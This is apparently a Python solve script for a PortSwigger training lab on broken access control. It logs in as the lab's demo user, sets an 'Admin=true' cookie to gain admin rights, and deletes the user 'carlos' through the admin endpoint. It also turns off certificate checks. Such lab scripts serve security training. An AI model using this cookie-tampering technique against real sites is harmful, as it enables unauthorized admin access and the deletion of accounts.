#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
User role controlled by request parameter.

Logs in as wiener, sets Admin=true cookie, then deletes carlos.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def login(session: requests.Session, lab: str, username: str, password: str) -> None:
    csrf = get_csrf(session, f"{lab}/login")
    r = session.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": password})
    if "Invalid username or password" in r.text:
        raise SystemExit("[-] Login failed")
    print(f"[*] Logged in as {username}")


def main():
    parser = argparse.ArgumentParser(
        description="Solve Access Control Lab 3 (role controlled by request parameter)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--username", default="wiener")
    parser.add_argument("--password", default="peter")
    parser.add_argument("--target", default="carlos", help="User to delete")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    login(s, lab, args.username, args.password)

    # Override the Admin cookie to true
    s.cookies.set("Admin", "true")
    print("[*] Set Admin=true cookie")

    r = s.get(f"{lab}/admin/delete?username={args.target}")
    if r.ok:
        print(f"[+] Deleted '{args.target}'. Lab solved.")
    else:
        print(f"[-] Unexpected status {r.status_code}")


if __name__ == "__main__":
    main()
